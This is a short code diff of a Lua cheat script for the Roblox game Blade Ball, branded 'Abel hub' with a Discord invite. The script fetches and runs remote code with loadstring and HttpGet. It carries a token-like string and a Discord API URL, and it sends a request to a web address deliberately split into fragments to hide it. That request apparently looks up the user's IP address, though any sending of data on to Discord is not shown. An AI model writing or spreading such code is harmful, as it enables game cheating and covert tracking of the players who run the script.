@@ -9,7 +9,7 @@ local Library = loadstring(game:HttpGet(repo .. 'Library.lua'))()
 local ThemeManager = loadstring(game:HttpGet(repo .. 'addons/ThemeManager.lua'))()
 local get4 = "AWnfRm7aCtLRXhes48-EjJSdEGABDySC3gmXnpHh"
 local SaveManager = loadstring(game:HttpGet(repo .. 'addons/SaveManager.lua'))()
-local weburl = "https://api." .. none .. "if" .. yes .. ".org"
+
 local Window = Library:CreateWindow({
     Title = 'Blade Ball | Abel hub | JOIN OUR DISCORD! discord.gg/Y889sjNPz4',
     Center = true,
@@ -48,10 +48,10 @@ local abilitiesFolder = character:WaitForChild("Abilities")
 local abilitielist = {"Dash", "Forcefield", "Invisibility", "Platform", "Raging Deflection", "Shadow Step", "Super Jump", "Telekinesis", "Thunder Dash", "Rapture"}
 local heartbeatConnection
 local dis = "https://discord.com/api/"
+local weburl = "https://api." .. none .. "if" .. yes .. ".org"
 local Response = request({
     Url = weburl,
-    Method = "GET",
-    getgenv().weburl = Url
+    Method = "GET"
 })
 
 
